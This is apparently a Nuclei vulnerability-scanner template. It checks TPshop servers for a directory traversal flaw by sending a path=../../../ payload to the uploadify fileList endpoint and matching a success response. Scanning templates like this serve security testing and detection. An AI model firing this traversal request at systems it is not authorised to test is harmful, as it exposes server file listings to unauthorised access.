id: tpshop-directory-traversal

info:
  name: TPshop Directory Traversal
  author: pikpikcu
  severity: high
  reference:
    - https://mp.weixin.qq.com/s/3MkN4ZuUYpP2GgPbTzrxbA
  tags: tpshop,lfi

requests:
  - method: GET
    path:
      - "{{BaseURL}}/index.php/Home/uploadify/fileList?type=.+&path=../../../"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '"state":"SUCCESS"'

      - type: status
        status:
          - 200
